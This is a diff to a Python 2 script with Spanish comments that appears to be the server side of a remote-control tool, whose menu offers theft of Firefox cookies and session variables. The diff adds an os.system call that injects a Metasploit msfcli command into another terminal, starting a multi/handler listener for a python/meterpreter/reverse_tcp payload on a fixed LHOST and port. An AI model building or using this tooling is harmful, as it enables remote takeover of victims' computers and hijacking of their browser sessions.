@@ -1,7 +1,7 @@
 #!/usr/bin/python
  
 #importamos el modulo para trabajar con sockets
-import socket, sys, ssl 
+import socket, sys, ssl, os
  
 #Creamos un objeto socket para el servidor. Podemos dejarlo sin parametros pero si 
 #quieren pueden pasarlos de la manera server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -20,6 +20,9 @@ except :
     print 'No se puede realizar la conexion'
     sys.exit()
  
+#METERPRETER
+os.system("./ttyecho -n /dev/tty3 \"msfcli exploit/multi/handler PAYLOAD=python/meterpreter/reverse_tcp LHOST=192.168.222.9 LPORT=6666 E\"")
+
 print "----------------Menu---------------------------------------------------------------------------------------------------" 
 print "Escribir el comando para realizar la accion descrita"
 print "a)cookies =  Modulo de obtencion de cookies y variables de sesion del explorador Mozilla Firefox."
